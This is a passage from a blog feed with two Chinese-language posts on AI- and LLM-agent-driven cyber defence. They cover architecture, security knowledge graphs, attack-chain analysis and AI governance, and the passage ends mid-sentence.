    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>自动化防御作为网络安全防御的发展趋势，一直是研究和讨论的重点话题。关于人工智能如何在其中发挥作用，尤其是目前大语言模型带来的变革，使得这一领域的热度空前高涨。</p><span id="more"></span><h2 id="研究背景"><a href="#研究背景" class="headerlink" title="研究背景"></a>研究背景</h2><p>目前的网络安全面临的主要问题有：</p><ul><li>攻击技术日趋复杂：随着网络技术的不断发展，攻击者在攻击技术方面也不断创新，采用了更加复杂、隐蔽的攻击手段，传统的安全防护措施难以有效应对。</li><li>攻击目标日益扩大：随着网络技术的普及应用，网络空间已经成为人们工作、生活的重要场所，各种重要信息和系统都存储在网络空间中。攻击者不仅针对政府、企业等重要机构，也针对个人、家庭等普通用户发起攻击，攻击目标日益扩大。</li><li>攻击动机多样：攻击者的动机也越来越多样化，不仅有窃取数据、破坏系统等传统动机，还有破坏社会秩序、影响国家安全等动机。这也给网络安全防护带来了更大的挑战。</li><li>安全人才短缺：网络安全人才是网络安全防护的重要力量。随着网络安全形势日趋严峻，对网络安全人才的需求也越来越大。然而，目前我国网络安全人才短缺的现状依然存在。</li></ul><p>面对以上四个主要问题，AI技术具有巨大的潜力，可以有效应对上述挑战，</p><ul><li>针对攻击技术日趋复杂的挑战：<ul><li>AI可以利用大数据分析技术，从海量数据中发现潜在的威胁，并对威胁进行深入分析，识别其攻击意图和行为模式，提高威胁检测和分析能力。</li><li>AI可以用于开发新的安全防护技术，相较于传统规则检测技术有着更好的泛化能力，从而更加有效地防御复杂、隐蔽的攻击。</li></ul></li><li>针对攻击目标日益扩大的挑战：<ul><li>AI可以用于自动化执行安全防护任务，例如漏洞扫描、威胁情报分析等，从而减轻安全人员的工作负担，提高安全防护的效率。</li><li>AI可以根据不同目标的特点，制定针对性的安全防护措施，从而提高安全防护的效果。</li></ul></li><li>针对攻击动机多样化的挑战：<ul><li>AI可以用于综合运用多种安全防护措施，从而提高安全防护的综合效果。</li><li>AI可以根据攻击动机的变化，调整安全防护措施，从而提高安全防护的灵活性。</li></ul></li><li>针对安全人才短缺的挑战：<ul><li>AI可以用于辅助安全人员执行安全防护任务，从而提高安全人员的工作效率。</li><li>AI可以用于自动化执行安全防护任务，从而减轻安全人员的工作负担。</li></ul></li></ul><p>总体而言，AI具有强大的学习和分析能力，可以有效应对网络安全面临的各种挑战，为提高网络安全水平提供新的思路和途径。</p><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><p>人工智能（Artificial Intelligence）或者说 AI 是一个耳熟能详的名词。人工智能的潜在目标或定义包含以下四个方面：</p><ul><li>思维模仿（Thinking Humanly）：通过人工智能技术使计算机系统能够模仿人类思维模式，包括推理、学习、问题解决等方面。</li><li>行为模仿（Acting Humanly）：使计算机系统能够表现出类似人类行为的特征，如语言交流、感知环境、执行任务等，以实现与人类的自然交互。</li><li>理性思考（Thinking Rationally）：通过逻辑推理、推断和问题求解等技术，使计算机能够以理性的方式思考和决策，而不仅仅是模仿人类的行为。</li><li>理性行为（Acting Rationally）：使计算机系统能够基于逻辑推理和准则行动，以实现在特定环境下最优化的决策和行为，而不一定模仿人类的行为方式。</li></ul><p>另一个概念叫做 Intelligence Agent，简称 IA，直译为智能代理或者智能实体。早在 18，19 世纪，哲学家 Denis Diderot 就提出了类似的概念，“如果找到一只能够回答所有事情的鹦鹉，那我毫不犹豫的称它是一个智能体。“事实上，关于 Agent 的概念，其根源可追溯到亚里士多德和休谟等有影响力的思想家。从一般意义上讲，Agent 是指具有行动能力的实体，Agent 的概念涉及自主性，有着行使意志、做出选择和采取行动的能力，而不是被动地对外部刺激做出反应。在人工智能领域，Agent 是一种计算实体。从本质上讲，AI Agent 并不等同于哲学上的 Agent；相反，它是 Agent 这一哲学概念在人工智能领域的具体化。我们将 AI Agent 视为能够使用传感器感知周围环境，做出决策，然后使用执行器采取行动的人造实体。</p><p>IA 的发展趋势大致如下：</p><ul><li>从最开始的符号式 Agents，典型代表为基于知识库的专家系统；</li><li>接着是反应式 Agents，根据环境的变化作出相应行动；</li><li>然后是如 AlphaGo 一般基于强化学习技术的 Agents；</li><li>再下面是结合了迁移学习和元学习技术的 Agents；</li><li>大语言模型横空出世之后，目前基于大语言模型的 Agents 成为全新的研究方向。</li></ul><h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><p>为此我们提出基于GDDRR模型的智能防御体系，主要理念是在实战中实现治理、检测、决策、响应、恢复五项任务的快速高效循环。在智能 Agents 驱动下的智能防御体系概述如下：</p><ul><li>为了实现系统高效运行，基于 Stix 2.1 框架，我们设计了一套完整的安全数据表示框架。在治理阶段，如威胁情报、资产台账、安全运营数据等均转换到统一的数据表示框架中去。通过知识图谱技术，存储到图数据库中，便于建立和展示数据实体间的相互关系。该阶段可参与的 Agents 类型包括符号式 Agents，反应式 Agents 以及大语言模型 Agents。</li><li>在检测阶段，符号式 Agents，具有迁移学习和元学习功能的 Agents 以及基于大语言模型的 Agents 通过学习人类安全专家的思维行为范式，在传统的基于机器学习、深度学习的检测小模型以及基于 pattern 匹配的规则引擎辅助下，快速高效的实现单步攻击识别。并在接下来的决策阶段，通过上下文的关联分析，将多种单步攻击串联，以攻击链的形式识别复合攻击，生成安全事件。</li><li>在响应和恢复阶段，反应式 Agents，基于强化学习技术的 Agents，联合迁移学习和元学习 Agents和大语言模型 Agents，根据单步攻击和复合攻击的研判结果，与对应安全产品交互，执行攻击阻断和风险修复的动作。</li><li>接下来又开始新一轮的循环，在全新的治理阶段中，更新上一轮循环提炼出的资产信息变更、运营数据变更以及攻防技战法等数据。循环往复，实现自洽的智能防御体系。</li></ul><h2 id="具体结构"><a href="#具体结构" class="headerlink" title="具体结构"></a>具体结构</h2><p>以大语言模型 Agents 为例，我们认为 IA 可分为 3 个模块，脑模块，感知模块和行动模块。</p><h3 id="脑模块"><a href="#脑模块" class="headerlink" title="脑模块"></a>脑模块</h3><p>脑模块作为 IA 的中央处理核心，它的首要功能是自然语言交互功能，其中涉及到核心问题有：</p><ul><li>多轮交互下的信息有效性和统一性问题；</li><li>高质量自然语言生成问题；</li><li>语言中隐藏含义的理解问题等。</li></ul><p>第二个功能涉及到知识领域，每个 IA 需要了解对应的知识，大体上可分为 3 种：</p><ul><li>语言知识，意味着 IA 需要了解输入的统一数据表示的意义；</li><li>常识知识；</li><li>专业领域知识。</li></ul><p>第三个是记忆功能，如何保证多轮交互以及多 Agent 交互之后的信息同步是很重要的课题。为此可能的解决办法有：</p><ul><li>提升 transformer 模型的长度限制；</li><li>将信息抽象提炼，再存入记忆模块；</li><li>压缩信息，寻找更为高效的信息表示方法；</li><li>共享记忆，类似外挂知识库的方案，但是这种做法又会涉及到数据隐私和安全的问题，我们后面再讨论。</li></ul><p>第四个是推理和规划功能，旨在培养 IA 形成人类一样的链式思维，一步一步的进行推导和规划。</p><p>最后是学习功能，为了形成自洽的系统，IA 必须要自主学习，从而摆脱必须依赖人类指令运行的情况。</p><h3 id="感知模块"><a href="#感知模块" class="headerlink" title="感知模块"></a>感知模块</h3><p>第二个是感知模块，这个模块相对而言比较简单明了，就是将多源异构的数据转换成统一的数据表示。</p><h3 id="行为模块"><a href="#行为模块" class="headerlink" title="行为模块"></a>行为模块</h3><p>最后一个是行为模块，这也是 IA 相对比较重要的模块。主要分为 2 个子功能：</p><ul><li>第一个是文字输出功能，即将抽象的统一数据转换成人类理解的自然语言。</li><li>第二个是工具模块。这里主要考虑的是在响应和恢复阶段，IA 需要能够根据分析研判结果，调用甚至制造对应的工具实现攻击阻断和风险修复等工作任务。</li></ul><h3 id="信息交互"><a href="#信息交互" class="headerlink" title="信息交互"></a>信息交互</h3><p>介绍完 Agent 架构之后，下面简要介绍一下系统内信息交互的模式。</p><p>首先对于单个 Agent 来说，主要分为3种情况：</p><ul><li>第一种是任务导向，那么这个 IA 只需要接受输入，根据人类指定的行为范式给出输出；</li><li>第二种是灵感导向，意思是人类给出一个目标，IA从结果逆推，自行寻找需要的输入并完成目标；</li><li>第三种是生命周期导向，是指类似 AutoGPT 那样的实体，自身实现一个任务的闭环运行无需人类的指令。</li></ul><p>对于 Agents 之间的交互场景概括起来其实很简单，就分为两种情况：</p><ul><li>一是多个 Agents 合作完成任务的模式；</li><li>二是 Agents 之间通过对抗的模式相互促进。</li></ul><p>最后是人机交互，也分为两种情况：</p><ul><li>一是指导-执行范式。指人类给出指令，指导 IA 执行对应动作；</li><li>二是合作范式，指人咧和机器合作完成相应任务目标。</li></ul><h2 id="困难与挑战"><a href="#困难与挑战" class="headerlink" title="困难与挑战"></a>困难与挑战</h2><p>理论框架介绍完成之后，接下来是面临的一些困难和挑战：</p><ul><li>首先是数据隐私和安全问题。目前以及未来都面临着 Agent 即服务的情况，指的是 Agent 就是人机交互的接口。IA 需要接触大量的数据去完成对应的任务，与之交互的人也就等于变相的接触到了这些数据。如何在这个环节中做好隐私数据防泄露，数据访问控制等问题至关重要。</li><li>第二个问题是，AI 模型本身因为数据集不平衡，算法不公平等客观条件的制约，存在定型观念和偏见。如何在多 Agents 交互的系统中始终保证平衡，不因为害群之马导致整个系统偏离方向也是个挑战。</li><li>为此，针对这样一个自洽的系统，需要一套行之有效的评估系统和约束手段，包含但不限于数据治理、算法治理、系统治理和伦理治理等方面。</li></ul><p>除了上面提到的困难与挑战，其实还有两点疑思值得进一步研究：</p><ul><li>首先是可信度问题。当人过于依赖智能的时候，保证结果的高置信度就是极大的考验，一些简单的小模型能够做到这一点，但是上升到庞大的系统可能需要全新的机制来保障。</li><li>其次是可靠性问题。对抗训练是目前机器学习领域热门的话题，即如何保证模型的鲁棒性，使其即使在受到特定攻击的情况下依然能够给出正确的判别结果。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以大语言模型为代表的 AI 技术给未来的体系架构带来了无限的可能，当然其中也暗藏着种种问题。当然我们应该对 AI 技术保持信心，毕竟它已经实现了许多人类之前难以想象的功能。未来的研究方向将聚焦于智能 Agent 的新方向，以及人工智能技术与网络安全自动化防御的更多结合。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;自动化防御作为网络安全防御的发展趋势，一直是研究和讨论的重点话题。关于人工智能如何在其中发挥作用，尤其是目前大语言模型带来的变革，使得这一领域的热度空前高涨。&lt;/p&gt;</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
    <category term="IA" scheme="https://coldwave96.github.io/tags/IA/"/>
    
    <category term="GenAI" scheme="https://coldwave96.github.io/tags/GenAI/"/>
    
  </entry>
  
  <entry>
    <title>智能防线：AI 驱动的网络空间防御体系</title>
    <link href="https://coldwave96.github.io/2023/10/19/IntelligenceDefence/"/>
    <id>https://coldwave96.github.io/2023/10/19/IntelligenceDefence/</id>
    <published>2023-10-18T23:50:23.000Z</published>
    <updated>2023-10-18T23:50:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本文论题为《智能防线：AI 驱动的网络空间防御体系》，主要从人工智能在网络空间安全智能防御体系中的现状、挑战、机遇与应用前景等方面综合阐述 AI + 智能防御的理念。</p><span id="more"></span><h3 id="网络安全目前面临的挑战"><a href="#网络安全目前面临的挑战" class="headerlink" title="网络安全目前面临的挑战"></a>网络安全目前面临的挑战</h3><p>网络安全目前面临的挑战主要包括以下几个方面：</p><ul><li>攻击技术日趋复杂：随着网络技术的不断发展，攻击者在攻击技术方面也不断创新，采用了更加复杂、隐蔽的攻击手段，传统的安全防护措施难以有效应对。例如，勒索软件攻击、供应链攻击、零日漏洞攻击等，都对网络安全造成了严重威胁。</li><li>攻击目标日益扩大：随着网络技术的普及应用，网络空间已经成为人们工作、生活的重要场所，各种重要信息和系统都存储在网络空间中。攻击者不仅针对政府、企业等重要机构，也针对个人、家庭等普通用户发起攻击，攻击目标日益扩大。</li><li>攻击动机多样：攻击者的动机也越来越多样化，不仅有窃取数据、破坏系统等传统动机，还有破坏社会秩序、影响国家安全等动机。这也给网络安全防护带来了更大的挑战。</li><li>安全人才短缺：网络安全人才是网络安全防护的重要力量。随着网络安全形势日趋严峻，对网络安全人才的需求也越来越大。然而，目前我国网络安全人才短缺的现状依然存在。</li></ul><h3 id="AI-在解决网络安全问题中的潜力"><a href="#AI-在解决网络安全问题中的潜力" class="headerlink" title="AI 在解决网络安全问题中的潜力"></a>AI 在解决网络安全问题中的潜力</h3><p>人工智能（AI）在解决网络安全问题方面具有巨大的潜力，可以有效应对上述挑战，</p><p>针对攻击技术日趋复杂的挑战，AI可以通过以下方式发挥作用：</p><ul><li>提高威胁检测和分析能力。AI可以利用大数据分析技术，从海量数据中发现潜在的威胁，并对威胁进行深入分析，识别其攻击意图和行为模式。</li><li>开发新的安全防护技术。AI可以用于开发新的安全防护技术，例如基于机器学习的防火墙、入侵检测系统等，这些技术可以更加有效地防御复杂、隐蔽的攻击。</li></ul><p>针对攻击目标日益扩大的挑战，AI可以通过以下方式发挥作用：</p><ul><li>提高安全防护的自动化水平。AI可以用于自动化执行安全防护任务，例如漏洞扫描、威胁情报分析等，从而减轻安全人员的工作负担，提高安全防护的效率。</li><li>提高安全防护的针对性。AI可以根据不同目标的特点，制定针对性的安全防护措施，从而提高安全防护的效果。</li></ul><p>针对攻击动机多样化的挑战，AI可以通过以下方式发挥作用：</p><ul><li>提高安全防护的综合性。AI可以用于综合运用多种安全防护措施，从而提高安全防护的综合效果。</li><li>提高安全防护的弹性。AI可以根据攻击动机的变化，调整安全防护措施，从而提高安全防护的灵活性。</li></ul><p>针对安全人才短缺的挑战，AI可以通过以下方式发挥作用：</p><ul><li>辅助安全人员工作。AI可以用于辅助安全人员执行安全防护任务，从而提高安全人员的工作效率。</li><li>自动化执行安全防护任务。AI可以用于自动化执行安全防护任务，从而减轻安全人员的工作负担。</li></ul><p>总体而言，AI具有强大的学习和分析能力，可以有效应对网络安全面临的各种挑战，为提高网络安全水平提供新的思路和途径。</p><h2 id="AI-对网络安全的革命性影响"><a href="#AI-对网络安全的革命性影响" class="headerlink" title="AI 对网络安全的革命性影响"></a>AI 对网络安全的革命性影响</h2><h3 id="AI-技术的简要概述"><a href="#AI-技术的简要概述" class="headerlink" title="AI 技术的简要概述"></a>AI 技术的简要概述</h3><p>人工智能的潜在目标或定义：</p><ul><li>思维模仿（Thinking Humanly）：通过人工智能技术使计算机系统能够模仿人类思维模式，包括推理、学习、问题解决等方面。</li><li>行为模仿（Acting Humanly）：使计算机系统能够表现出类似人类行为的特征，如语言交流、感知环境、执行任务等，以实现与人类的自然交互。</li><li>性思考（Thinking Rationally）：通过逻辑推理、推断和问题求解等技术，使计算机能够以理性的方式思考和决策，而不仅仅是模仿人类的行为。</li><li>理性行为（Acting Rationally）：使计算机系统能够基于逻辑推理和准则行动，以实现在特定环境下最优化的决策和行为，而不一定模仿人类的行为方式。</li></ul><h3 id="AI-在网络安全中的应用案例"><a href="#AI-在网络安全中的应用案例" class="headerlink" title="AI 在网络安全中的应用案例"></a>AI 在网络安全中的应用案例</h3><p>人工智能（AI）在网络安全领域的应用日益广泛，以下是目前部分应用场景</p><ul><li>威胁检测和分析：基于机器学习的威胁检测和分析系统，这些系统可以从海量数据中发现潜在的威胁，并对威胁进行深入分析，识别其攻击意图和行为模式。</li><li>安全防护：基于机器学习的防火墙、入侵检测系统等，这些技术更加有效地防御复杂、隐蔽的攻击。</li><li>安全运营：自动化执行安全运营任务，例如漏洞扫描、威胁情报分析等，从而减轻安全人员的工作负担，提高安全运营的效率。</li></ul><h3 id="AI-在提高网络安全性能方面的潜在优势"><a href="#AI-在提高网络安全性能方面的潜在优势" class="headerlink" title="AI 在提高网络安全性能方面的潜在优势"></a>AI 在提高网络安全性能方面的潜在优势</h3><p>AI在提高网络安全性能方面具有许多潜在优势，其中一些包括：</p><ul><li>实时威胁检测：AI可以实时监测和分析网络活动，并快速检测到潜在的安全威胁，从而提高威胁检测的速度和准确性。</li><li>智能自动化响应：借助AI的自动化能力，可以快速响应安全威胁，自动隔离受感染的设备或阻止恶意流量，从而加快安全事件的响应速度并降低潜在的损失。</li><li>异常行为识别：AI可以识别网络中的异常行为模式，并自动发出警报或阻止可疑的活动，从而帮助提高对新型威胁的识别能力。</li><li>自动化安全补丁管理：AI可以帮助自动管理系统和软件的安全补丁更新，确保网络中的设备始终处于最新的安全状态，从而减少由于漏洞和脆弱性导致的安全风险。</li><li>大规模数据分析：AI可以分析和处理大规模的安全数据，从而识别出潜在的威胁模式和趋势，帮助提前预防未来可能的网络安全威胁。</li><li>智能身份验证和访问控制：AI可以实现更强大的身份验证和访问控制，包括基于生物特征的身份识别和行为分析，从而提高网络中数据和资源的安全性。</li></ul><p>通过利用这些潜在优势，AI可以在提高网络安全性能方面发挥重要作用，帮助组织应对日益复杂的网络安全威胁和风险。</p><h3 id="大语言模型带来的行业冲击与变革"><a href="#大语言模型带来的行业冲击与变革" class="headerlink" title="大语言模型带来的行业冲击与变革"></a>大语言模型带来的行业冲击与变革</h3><p>从 2018 年的 GPT-1，到 2022 年 11 月正式发布的 ChatGPT，再到 2023 年 3 月发布的最新 GPT-4，大语言模型的浪潮也给网络安全行业带来巨大的变革， 包括但不限于以下几个方面：</p><ul><li>增强攻击能力：恶意行为者可以利用大语言模型的能力来生成更真实、更具欺骗性的网络钓鱼邮件、虚假信息以及伪造的内容，使得传统的安全防御手段变得更加困难。</li><li>智能安全防御：大语言模型的引入推动了智能安全防御技术的发展，使得安全防御系统具备更强大的自动化和智能化能力，能够更准确地识别和应对复杂的网络安全威胁。</li><li>数据隐私挑战：大语言模型在训练过程中需要大量的数据，这可能涉及到大量的个人隐私信息。网络安全行业面临着确保这些数据安全的挑战，包括加强数据保护、隐私保密和安全存储等方面的工作。</li><li>新型安全解决方案：针对大语言模型带来的新型安全挑战，网络安全行业不断探索并研发新的安全解决方案，包括基于AI的安全分析、大数据分析技术、以及对抗生成网络（GAN）等技术的应用，以提升网络安全的防御能力。</li><li>人才需求变化：随着大语言模型技术的不断发展，网络安全行业对具备AI技术背景的专业人才的需求日益增加，这促使了相关人才的培养和网络安全领域的人才结构调整。</li></ul><p>总的来说，大语言模型的出现既带来了网络安全行业面临的新挑战，也催生了一系列新的安全解决方案和发展机遇，推动了网络安全行业朝着更加智能化、自动化和专业化的方向发展。</p><h2 id="AI-治理下的网络安全挑战与未来展望"><a href="#AI-治理下的网络安全挑战与未来展望" class="headerlink" title="AI 治理下的网络安全挑战与未来展望"></a>AI 治理下的网络安全挑战与未来展望</h2><h3 id="隐私保护与数据安全挑战"><a href="#隐私保护与数据安全挑战" class="headerlink" title="隐私保护与数据安全挑战"></a>隐私保护与数据安全挑战</h3><p>在当前以及即将到来的 AI 驱动下的智能防御体系中，网络安全隐私保护与数据安全面临着诸多挑战，包括但不限于以下几个方面：</p><ul><li>隐私数据泄露风险：在AI分析和处理数据的过程中，存在着隐私数据泄露的风险，尤其是在涉及个人敏感信息的场景中，需要采取有效措施确保数据的安全性和隐私性。</li><li>数据访问控制困难：在复杂的网络环境下，管理和控制数据的访问权限变得更加困难，特别是当涉及多个数据源和多个AI模型的情况下，确保数据只被授权的人员和系统访问是一个挑战。</li><li>数据集成与安全性：在整合不同来源的数据用于AI分析时，需要解决数据的完整性、一致性和安全性问题，确保数据集成的过程不会导致数据泄露或篡改。</li><li>数据算法安全性：AI算法的安全性也是一个挑战，恶意用户可以通过操纵训练数据或者攻击AI模型来获取敏感信息，因此需要加强对算法的安全性分析和保护措施。</li><li>法规合规与数据安全：在数据传输和处理过程中，由于数据保护法规存在差异，合规性问题成为数据安全的重要考量因素，需要建立符合不同法规的数据安全管理制度。</li></ul><p>为应对这些挑战，需要建立完善的数据安全管理制度和隐私保护机制，包括加密技术的应用、访问控制的强化、安全审计和监控系统的建立，以及遵循法规合规标准等措施，以确保在AI治理下网络安全隐私保护与数据安全得到有效维护。</p><h3 id="建立可信的-AI-治理框架"><a href="#建立可信的-AI-治理框架" class="headerlink" title="建立可信的 AI 治理框架"></a>建立可信的 AI 治理框架</h3><p>可信的 AI 治理框架应该从以下几个方面入手：</p><ul><li>数据治理：确保 AI 系统使用的数据安全可靠、符合隐私保护要求。<ul><li>制定数据采集、使用、存储、销毁等方面的规范，确保数据安全可靠、符合隐私保护要求。</li><li>建立数据安全审计制度，定期对数据进行安全检查，发现和修复安全漏洞。</li><li>完善用户隐私保护机制，保障用户的知情权、选择权和同意权。</li></ul></li><li>算法治理：确保 AI 系统的算法透明可解释、公平无偏。<ul><li>要求 AI 系统的算法透明可解释，使用户能够理解 AI 系统的决策过程。</li><li>建立算法公平性评估机制，确保 AI 系统的决策结果公平无偏。</li><li>制定算法安全审计规范，定期对算法进行安全检查，发现和修复安全漏洞。</li></ul></li><li>系统治理：确保 AI 系统的安全性、可靠性、可持续性。<ul><li>制定 AI 系统的安全设计规范，确保 AI 系统的安全性和可靠性。</li><li>建立 AI 系统的安全测试机制，确保 AI 系统能够抵御常见的攻击。</li><li>制定 AI 系统的安全应急响应预案，快速响应和处置安全事件。</li></ul></li><li>伦理治理：确保 AI 系统的使用符合伦理规范。<ul><li>制定 AI 系统的伦理规范，确保 AI 系统的使用符合伦理要求。</li><li>建立 AI 系统的伦理审查机制，确保 AI 系统的使用符合伦理规范。</li></ul></li></ul><h3 id="面向未来的网络空间智能防御体系"><a href="#面向未来的网络空间智能防御体系" class="headerlink" title="面向未来的网络空间智能防御体系"></a>面向未来的网络空间智能防御体系</h3><p>提到智能防御体系，肯定离不开人工智能技术的加持。传统的人工智能在安全领域的应用局限于单点的小模型，无法在全局上把握安全态势，依然需要大量的安全专家投入海量数据的分析整合。在大模型介入之后，通过其优秀的文本理解能力和文本生成能力，有希望作为调度中台，扮演安全专家的角色，收集规则引擎或人工智能小模型的研判结果并分析上下文，确定安全事件后联动安全产品及时响应。</p><p>智能代理（Intelligence Agents）的概念并不陌生，借鉴斯坦福大学研究的 AI 小镇项目，结合大模型提出了生成式代理（Generative Agents）这一角色。根据他们的研究，建立 25 个独立的生成式代理，通过共享记忆等机制保证信息在代理间传递的统一性，实现了一个一定程度上自洽的社会。这个项目给力我们一定的启发，在智能防御体系中，我们也可以定向的训练出不同用途的生成式代理，它们各司其职，最终实现一个完整自洽的分析研判，联动防御的自动化系统。</p><p>为了实现这样的目标，需要进一步研究的技术包括：</p><ul><li>网络安全知识的抽取和融合<ul><li>网络安全知识的来源广泛，包括漏洞库、病毒库、告警数据、安全厂商的检测结果、安全论坛、网络安全事件报告资产描述等，为构建大规模的网络安全知识大脑，需要首先从不同来源的网络安全数据中抽取知识，并对不同领域的网络安全知识进行有效融合。</li><li>网络安全数据主要以文本数据、结构化数据、 半结构化数据等类型为主，可以采用人工智能技术对数据进行抽取。例如，可以使用word2vec 技术将文本中的单词转换为向量，结合卷积神经网络 （CNN），BiLSTM，条件随机场算法（CRF）等技术进行实体和关系识别，同时按照网络安全知识的类型进行分类，并将分类以后的实体和关系添加到对应网络安全知识的实例中进行保存。</li><li>由于网络安全中用于训练的预料数据有限，可能无法覆盖所有的网络安全知识，因此需要根据已有的网络安全知识进行推理，生成新的知识。此类知识推理的方法主要包括两种，一种是自定义推理规则，根据预先制定的规则进行知识推理和演绎；第二种是采用智能化技术，根据已有的知识进行概率推理，计算新知识存在的概率。第一种方法需要人为地定义推理规则，可扩展性较差；第二种方法使用深度神经网络进行计算新知识存在的概率，可扩展性强，但是可解释性较第一种方法差一些。</li><li>不同数据源抽取得到的网络安全知识可能会有不同的描述方式，因此需要对网络安全知识进行有效融合。常用的融合方法包括实体对齐、基于知识表示的消歧等，基本思想是将不同的网络安全知识库按照实体和关系的统一描述进行融合。</li></ul></li><li>网络安全知识表示<ul><li>常用的知识表示模型包括符号逻辑、语义网、专家系统、知识图谱、MDATA 模型等，通过知识表示可以将网络安全中不同类型的知识描述为统一的形式，并可通过知识的向量化进行高效计算。</li><li>知识图谱主要采用”&lt; 实体，关系，实体 &gt;”这种三元组形式对具体的知识进行表示。知识图谱能有效描述网络安全知识，但是当知识动态变化时，对应的三元组及相关联的知识很难及时更新。</li><li>MDATA 模型对实体之间的关系、属性的时空特性进行表达，从而有效表示网络安全知识的动态变化情况。具体而言，在关系和实体属性上增加了时间和空间特性，如某系统存在漏洞的知识，添加存在漏洞的时间区间，从而能更详细地表示系统的实际安全情况。网络攻击可能通过不同的 IP（网络 之间互连的协议）地址等，攻击事件中的 IP 地址等特性则作为网络安全知识中的空间特性。MDATA 模型通过对时间、空间特性的描述，可以表示出网络安全知识的动态变化过程。</li></ul></li><li>网络安全知识大脑构建<ul><li>网络安全知识大脑的构建包括两部分：网络安全知识库（SeKG）和场景知识库（ScKG）。其中，网络安全知识库是通用的网络安全知识的集合，并且可以随时或定期更新补充；而场景知识库是特定知识的集合，可以依据仿真攻击的设定而定，也是描述具体攻击行为的知识库。</li><li>网络安全知识库和场景知识库可以根据概念、实例、关系、属性、规则的五元组模型进行构建。</li></ul></li><li>基于网络安全知识大脑的攻击事件研判<ul><li>网络空间防御面临的主要威胁是网络攻击，一般而言网络攻击可以分为单步攻击和复合攻击。单步攻击可以理解为针对某资产发动的离散的攻击，而复合攻击可以理解为是有多个单步攻击排列组合而成的，也就是说复合攻击有多个攻击步骤，而这些攻击步骤之间是有关系的，不是离散的、无关联的，攻击步骤之间有因果关系、顺承关系、选择关系等。</li><li>单步攻击的研判相对而言简单，已有的基于规则、特征的检测方法能取得很高的成功率。而复合攻击的检测难度大，典型的复合攻击包括 APT 攻击等。复合攻击通常是以攻击链的形式发生的，可以看作是多个单步攻击的排列组合。</li><li>使用网络安全知识大脑研判网络攻击时，可利用有限状态机，设置初始状态、中间状态、终止状态和触发条件，并添加容错机制，可以在缺失数据的时候仍然生成复合攻击的攻击链，在网络安全知识库和场景知识库的基础上，描述复合攻击的各个步骤之间的关系，然后根据攻击步骤的关系、时间先后关系、IP 的传播关系等来判断是否可以生成攻击链。如果满足，则输出复合攻击的攻击链，如果不满足，就去知识库中查找等价的步骤，或补充生成攻击链并输出。当输入的数据中存在误报和漏报的情况时，基于网络安全知识大脑的研判可以自动补全缺失的信息，生成一条完整的攻击链，从而提高攻击研判的准确率，为网络安全主动防御提供支撑。</li></ul></li></ul><h2 id="结论与行动呼吁"><a href="#结论与行动呼吁" class="headerlink" title="结论与行动呼吁"></a>结论与行动呼吁</h2><h3 id="总结-AI-在网络安全中的关键作用"><a href="#总结-AI-在网络安全中的关键作用" class="headerlink" title="总结 AI 在网络安全中的关键作用"></a>总结 AI 在网络安全中的关键作用</h3><p>网络空间安全相关的数据体量大、数据种类多、数据增长快，传统的分析技术在处理此类数据时效率低、准确率低。人工智能在处理海量数据、多源数据、动态数据等方面具有显著的优势，能助力于网络空间安全，提升网络防御能力。</p><ul><li>海量数据的快速处理能力：网络空间安全相关的数据体量大，例如系统中保存的日志数据、网络流量数据等，处理如此海量的数据既需要庞大的算力支撑，也需要能处理如此海量数据的智能算法。由于人工智能技术能从海量数据中学习数据的特征，根据特征再对数据进行分类、聚类等处理，能大幅度提升效率和准确度。</li><li>多源异构数据的高效关联能力：网络安全相关的数据种类繁多、来源广泛，如通过传感器、网络爬虫、日志收集系统等能采集到不同类型的数据，从来源上数据类型可以分为环境业务数据、网络层数据、日志层数据、告警数据等类别，综合不同来源的异构数据进行综合分析能提升网络空间主动防御能力。</li><li>动态数据的实时在线处理能力：网络空间安全相关的数据增长速度快，时效性要求高。专家系统的缺陷在于专家知识更新慢，利用专家系统能快速检测已知的网络攻击，但是对于未知的网络攻击事件，专家系统的知识往往由于更新不及时，导致系统无法正确检测。此时，需要结合人工智能技术赋予的预测能力，对动态的数据设计在线算法，能够结合已有的网络安全知识和实时的数据判断当前的潜在网络攻击；根据已经发生的攻击事件和历史数据，建立攻击预测模型，预测未来可能发生的攻击行为，通过人工智能技术增强系统的预测能力，提供动态防御能力，提升网络安全事件的快速响应能力。</li></ul><h3 id="提出行动和解决方案"><a href="#提出行动和解决方案" class="headerlink" title="提出行动和解决方案"></a>提出行动和解决方案</h3><p>构建动态可扩展的网络安全知识大脑</p><ul><li>充分利用人工智能技术在处理海量数据、多源异构数据、实时动态数据等方面的显著优势，构建动态可扩展的网络安全知识大脑，提升网络空间防御能力。</li><li>具体而言，针对网络安全知识描述中多实体、弱关系、时空复杂性和多来源等特点，对于结构化、半结构化和非结构化的数据，基于 MDATA 